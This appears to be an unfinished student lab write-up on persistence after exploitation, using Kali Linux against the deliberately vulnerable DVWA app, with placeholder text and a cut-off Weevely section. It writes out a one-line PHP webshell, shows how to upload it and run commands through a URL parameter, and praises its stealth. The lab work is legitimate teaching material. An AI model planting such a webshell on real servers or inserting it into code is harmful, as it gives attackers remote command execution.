# Task 2: Maintaining Access  
## Disclaimer  
**This project is for educational purposes only. All testing was performed in a
controlled environment or on authorized targets.

## Introduction  
**Maintaining Access** phase or also known as **persistence** in the target system, involves hacker that installs software or make changes to the target machine in order to access the target over time. Hence, allowing the hacker to stay connected with the target machine which prevent the need to start the process from scratch for the same target― *geeksforgeeks*  

*Kali Linux* comes with multiple pre-installed hacking tools for all phases of ethical hacking. Under the post-exploitation category there are several hacking tools that are meant for maintaining access. The tools are classified as follows: -  
- OS back doors
- Tunnelling and exfiltration
- Web back doors

**Objective:** To demonstrate post-exploitation techniques for maintaining access on a compromised target server using three distinct tools (*Webshells; Weevely; Cryptcat*).  
**Target Environment:** *Kali Linux* (Attacker) and Vulnerable Target Application (Damn Vulnerable Web Application, *DVWA*)  

## Installing & Setting up Target Environment: Vulnerable Target Application (DVWA)  
(insert ss)  
**Command**: `blahblah`

## Tool 1: Webshells  
Webshell consist of a single-line script that executes system commands through web browser URL parameters. They are written in web programming languages such as *PHP, Java, Perl* and others. An attacker can control the script and a *command injection vulnerability* occurs.  
**Key Features Used:**  
- Simplicity: Small enough to be hidden inside legitimate website code without drawing attention.
- Firewall Evasion: Traffic blends in perfectly with normal HTTP/HTTPS web browsing.
- Stateless Execution: Does not hold a constant, open network connection that administrators might detect, and only connects when a command is actively sent.

**Step-by-Step Execution**  

**Step 1: Creating a Backdoor**
(insert ss)  
**Command:** `echo "<?php system(\$_GET['cmd']); ?>" > simple_shell.php`    
**Reason of command:** This writes a tiny PHP script that takes whatever text is placed in the `cmd` URL parameter and passes it directly to the underlying Linux operating system.  
**Step 2: Uploading & Executing**  
(insert ss)  
**Action:** Upload php file in DVWA and accessed via web browser at `.../simple_shell.php?cmd=whoami`  
**Reason of action:** Navigating to this specific URL triggers the Apache web server to run the PHP script, execute the system command (`whoami`), and print the result straight to the webpage.  

## Tool 2: Weevely  





